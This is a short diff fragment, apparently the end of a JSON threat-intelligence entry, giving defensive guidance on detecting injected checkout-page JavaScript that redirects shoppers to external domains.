+                  "how_to_detect": "Continuously monitor the source code of checkout and cart pages for unauthorized or unexpected JavaScript, especially scripts that perform URL-based checks and trigger redirects to external domains. Implement allowlisting for legitimate payment and partner domains, and alert on any redirect or network request to domains outside this list during the checkout process. Regularly audit third-party ad scripts and scan for obfuscated or injected code that could introduce redirect logic."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
